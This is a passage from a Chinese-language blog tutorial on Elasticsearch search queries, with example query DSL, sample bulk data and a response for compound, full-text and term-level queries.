&quot;kimchy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index_boost用来在多个索引搜索中提高部分索引的重要性。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;indices_boost&quot;: [</span><br><span class="line">    &#123; &quot;my-alias&quot;:  1.4 &#125;,</span><br><span class="line">    &#123; &quot;my-index*&quot;: 1.3 &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h4><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot; : &#123;</span><br><span class="line">    &quot;match&quot;: &#123; &quot;user.id&quot;: &quot;kimchy&quot; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;highlight&quot; : &#123;</span><br><span class="line">    &quot;pre_tags&quot; : [&quot;&lt;tag1&gt;&quot;, &quot;&lt;tag2&gt;&quot;],</span><br><span class="line">    &quot;post_tags&quot; : [&quot;&lt;/tag1&gt;&quot;, &quot;&lt;/tag2&gt;&quot;],</span><br><span class="line">    &quot;fields&quot; : &#123;</span><br><span class="line">      &quot;body&quot; : &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="近实时搜索"><a href="#近实时搜索" class="headerlink" title="近实时搜索"></a>近实时搜索</h3><p>当一个文档被存储在es里面的时候，它被建立索引和完全搜索是近实时性的，大概一分钟。</p><p>es基于有着按段搜索概念的Lucene，段类似于倒排索引。当提交一个文档后，一个新的段会被提交到提交点，然后缓存被清除。</p><p>位于es和磁盘之间的是文件系统缓存，内存缓冲区的文档会被写到一个新的段里面，这个新段首先会被写入到系统文件缓存里面（代价小），稍后会被刷新到磁盘（代价昂贵）。</p><p>在es里面，写入和打开一个新段的操作交作refresh，refresh可以使自从上次refresh之后的对于index的操作可以被搜索。</p><h3 id="复合查询"><a href="#复合查询" class="headerlink" title="复合查询"></a>复合查询</h3><h4 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h4><ul><li><p>  <code>must</code> 参与评分</p></li><li><p>  <code>filter</code> 不计入评分</p></li><li><p>  <code>should</code> 参与评分</p></li><li><p>  <code>must_not </code> 不参与评分</p></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST my-index-000001/_bulk</span><br><span class="line">&#123; &quot;index&quot;: &#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;address&quot;:&quot;中国北京&quot;,&quot;age&quot;:23&#125;</span><br><span class="line">&#123;&quot;index&quot;: &#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;李四&quot;, &quot;address&quot;: &quot;中国上海&quot;, &quot;age&quot;: 22&#125;</span><br><span class="line">&#123;&quot;index&quot;: &#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;王五&quot;, &quot;address&quot;: &quot;中国杭州&quot;, &quot;age&quot;: 23&#125;</span><br><span class="line">&#123;&quot;index&quot;: &#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;马六&quot;, &quot;address&quot;: &quot;中国杭州&quot;, &quot;age&quot;: 22&#125;</span><br></pre></td></tr></table></figure><p>查询address为杭州，年龄为23的张性人世。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">        &quot;should&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;match&quot;: &#123;</span><br><span class="line">            &quot;address&quot;: &quot;杭州&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;match&quot;: &#123;</span><br><span class="line">            &quot;name&quot;: &quot;张&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      &quot;must&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;match&quot;: &#123;</span><br><span class="line">            &quot;address&quot;: &quot;杭州&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ], </span><br><span class="line">      &quot;must_not&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;match&quot;: &#123;</span><br><span class="line">            &quot;age&quot;: 22</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="boosting"><a href="#boosting" class="headerlink" title="boosting"></a>boosting</h4><p>有三个参数positive、negative、negative_boost，可以设定negative的百分比来提升postive匹配的分值。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 杭州的年龄不是23的排在前面。</span><br><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;boosting&quot;: &#123;</span><br><span class="line">      &quot;positive&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">          &quot;address&quot;: &quot;杭州&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;negative&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">          &quot;age&quot;: 23</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;negative_boost&quot;: 0.9</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="constant-score"><a href="#constant-score" class="headerlink" title="constant_score"></a>constant_score</h4><p>通过filter查询到的所有结果得分一样。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;constant_score&quot;: &#123;</span><br><span class="line">      &quot;filter&quot;: &#123;</span><br><span class="line">        &quot;term&quot;: &#123;</span><br><span class="line">          &quot;address.keyword&quot;: &quot;中国杭州&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;boost&quot;: 1.2</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="dis-max"><a href="#dis-max" class="headerlink" title="dis_max"></a>dis_max</h4><p><code>queries</code>：当里面有1个条件或多个条件满足时，代表命中。</p><p><code>tie_breaker</code>：当queries里面多个条件都满足，则score+tie_breaker的值，范围0-1。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;dis_max&quot;: &#123;</span><br><span class="line">      &quot;tie_breaker&quot;: 0.5,</span><br><span class="line">      &quot;boost&quot;: 1,</span><br><span class="line">      &quot;queries&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">        &quot;term&quot;: &#123;</span><br><span class="line">          &quot;age&quot;: 22</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">        &quot;term&quot;: &#123;</span><br><span class="line">          &quot;address.keyword&quot;: &quot;中国杭州&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="function-score"><a href="#function-score" class="headerlink" title="function_score"></a>function_score</h4><p>自定义分值规则</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;function_score&quot;: &#123;</span><br><span class="line">      &quot;query&quot;: &#123;&quot;match_all&quot;: &#123;&#125;&#125;,</span><br><span class="line">      &quot;functions&quot;: [</span><br><span class="line">        &#123;&quot;filter&quot;: &#123;&quot;match&quot;: &#123;&quot;address&quot;: &quot;杭州&quot;&#125;&#125;,</span><br><span class="line">        &quot;weight&quot;: 42</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;filter&quot;: &#123;&quot;match&quot;: &#123;&quot;address&quot;: &quot;上海&quot;&#125;&#125;,</span><br><span class="line">          &quot;weight&quot;: 58</span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      &quot;boost&quot;: 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--- response ----</span><br><span class="line">&#123;</span><br><span class="line">  &quot;took&quot;: 1,</span><br><span class="line">  &quot;timed_out&quot;: false,</span><br><span class="line">  &quot;_shards&quot;: &#123;</span><br><span class="line">    &quot;total&quot;: 1,</span><br><span class="line">    &quot;successful&quot;: 1,</span><br><span class="line">    &quot;skipped&quot;: 0,</span><br><span class="line">    &quot;failed&quot;: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;hits&quot;: &#123;</span><br><span class="line">    &quot;total&quot;: &#123;</span><br><span class="line">      &quot;value&quot;: 4,</span><br><span class="line">      &quot;relation&quot;: &quot;eq&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;max_score&quot;: 58,</span><br><span class="line">    &quot;hits&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot;: &quot;my-index-000001&quot;,</span><br><span class="line">        &quot;_id&quot;: &quot;PlOgc44BZzmEdr0pI4Mf&quot;,</span><br><span class="line">        &quot;_score&quot;: 58,</span><br><span class="line">        &quot;_source&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;李四&quot;,</span><br><span class="line">          &quot;address&quot;: &quot;中国上海&quot;,</span><br><span class="line">          &quot;age&quot;: 22</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot;: &quot;my-index-000001&quot;,</span><br><span class="line">        &quot;_id&quot;: &quot;P1Ogc44BZzmEdr0pI4Mf&quot;,</span><br><span class="line">        &quot;_score&quot;: 42,</span><br><span class="line">        &quot;_source&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;王五&quot;,</span><br><span class="line">          &quot;address&quot;: &quot;中国杭州&quot;,</span><br><span class="line">          &quot;age&quot;: 23</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot;: &quot;my-index-000001&quot;,</span><br><span class="line">        &quot;_id&quot;: &quot;QFOgc44BZzmEdr0pI4Mf&quot;,</span><br><span class="line">        &quot;_score&quot;: 42,</span><br><span class="line">        &quot;_source&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;马六&quot;,</span><br><span class="line">          &quot;address&quot;: &quot;中国杭州&quot;,</span><br><span class="line">          &quot;age&quot;: 22</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot;: &quot;my-index-000001&quot;,</span><br><span class="line">        &quot;_id&quot;: &quot;PVOgc44BZzmEdr0pI4Mf&quot;,</span><br><span class="line">        &quot;_score&quot;: 1,</span><br><span class="line">        &quot;_source&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;张三&quot;,</span><br><span class="line">          &quot;address&quot;: &quot;中国北京&quot;,</span><br><span class="line">          &quot;age&quot;: 23</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="全文本扫描"><a href="#全文本扫描" class="headerlink" title="全文本扫描"></a>全文本扫描</h3><h4 id="match"><a href="#match" class="headerlink" title="match"></a>match</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &quot;北京 上海&quot;,</span><br><span class="line">        &quot;boost&quot;: 10</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果包括上海和北京，空格表示or的关系，boost表示将查出来的分数乘以这个值，所以0-1会变小，&gt;1会变大。</p><h4 id="match-phrase"><a href="#match-phrase" class="headerlink" title="match_phrase"></a>match_phrase</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match_phrase&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &quot;北京 上海&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>什么都不会返回，因为当成一个词条来查询。</p><h4 id="match-phrase-prefix"><a href="#match-phrase-prefix" class="headerlink" title="match_phrase_prefix"></a>match_phrase_prefix</h4><p>前缀匹配</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match_phrase_prefix&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &quot;中国杭&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="query-string"><a href="#query-string" class="headerlink" title="query_string"></a>query_string</h4><p>搜索address中带有<code>上</code>和<code>杭</code>的文档。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;query_string&quot;: &#123;</span><br><span class="line">      &quot;default_field&quot;: &quot;addre*&quot;,</span><br><span class="line">      &quot;query&quot;: &quot;上 or 杭&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>default_field</code>支持正则，</p><h3 id="词条查询（精确查询）"><a href="#词条查询（精确查询）" class="headerlink" title="词条查询（精确查询）"></a>词条查询（精确查询）</h3><p>精确查找表示条件不会被分词器进行处理，只会当做原始的词条进行搜索</p><p>准备数据</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST my-index-000001/_bulk</span><br><span class="line">&#123; &quot;index&quot;: &#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;address&quot;:&quot;china beijing&quot;,&quot;age&quot;:23&#125;</span><br><span class="line">&#123;&quot;index&quot;: &#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;李四&quot;, &quot;address&quot;: &quot;china shanghai&quot;, &quot;age&quot;: 22&#125;</span><br><span class="line">&#123;&quot;index&quot;: &#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;王五&quot;, &quot;address&quot;: &quot;china hangzhou&quot;, &quot;age&quot;: 23&#125;</span><br><span class="line">&#123;&quot;index&quot;: &#123;&#125;&#125;</span><br><span class="line">&#123;&quot;name&quot;:&quot;马六&quot;, &quot;address&quot;: &quot;china hangzhou&quot;, &quot;age&quot;: 22&#125;</span><br></pre></td></tr></table></figure><h4 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h4><p>查询结果存在addres字段的文档。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;exists&quot;: &#123;</span><br><span class="line">      &quot;field&quot;: &quot;addres&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fuzzy"><a href="#fuzzy" class="headerlink" title="fuzzy"></a>fuzzy</h4><p>近似查询，支持如下</p><ul><li>  Changing a character (<strong>b</strong>ox → <strong>f</strong>ox)</li><li>  Removing a character (<strong>b</strong>lack → lack)</li><li>  Inserting a character (sic → sic<strong>k</strong>)</li><li>  Transposing two adjacent characters (<strong>ac</strong>t → <strong>ca</strong>t)</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;fuzzy&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &#123;</span><br><span class="line">        &quot;value&quot;: &quot;beijina&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 能返回beijing的文档。</span><br></pre></td></tr></table></figure><h4 id="prefix"><a href="#prefix" class="headerlink" title="prefix"></a>prefix</h4><p>词条的前缀匹配</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;prefix&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &#123;</span><br><span class="line">        &quot;value&quot;: &quot;b&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 能返回address为china beijing的文档。</span><br></pre></td></tr></table></figure><h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p>范围查找</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;: &#123;</span><br><span class="line">      &quot;age&quot;: &#123;</span><br><span class="line">        &quot;gte&quot;: 10, # gte:大于等于 gt: 大于</span><br><span class="line">        &quot;lte&quot;: 22# lte:小于等于 lt: 小于</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 查找年纪在10到22岁的文档。</span><br></pre></td></tr></table></figure><h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>正则查找</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;regexp&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &quot;bei.*g&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="term"><a href="#term" class="headerlink" title="term"></a>term</h4><p>词条查询，不会使用分词器对查询的数据进行分词，整体当做一个词条来查询。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 能出结果</span><br><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;term&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &quot;china&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 没有结果</span><br><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;term&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &quot;china a&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 如果使用match都有结果。</span><br></pre></td></tr></table></figure><h4 id="terms"><a href="#terms" class="headerlink" title="terms"></a>terms</h4><p>支持对多个词条进行查询，默认是或者的关系，也就是只要满足其中一个就行。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;terms&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: [</span><br><span class="line">        &quot;hangzhou&quot;,</span><br><span class="line">        &quot;china&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="terms-set"><a href="#terms-set" class="headerlink" title="terms_set"></a>terms_set</h4><p>和term的逻辑类似，其中有个minimum_should_match表示address这个terms数组最少得包含2个。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;terms_set&quot;: &#123;</span><br><span class="line">      &quot;address&quot;: &#123;</span><br><span class="line">        &quot;terms&quot;: [ &quot;china&quot;, &quot;beijing&quot;, &quot;shanghai&quot; ],</span><br><span class="line">        &quot;minimum_should_match&quot;: &quot;2&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 结果返回china beijing和china shanghai，而china hangzhou不会被返回。</span><br></pre></td></tr></table></figure><h4 id="wildcard"><a href="#wildcard" class="headerlink" title="wildcard"></a>wildcard</h4><p>使用正则</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 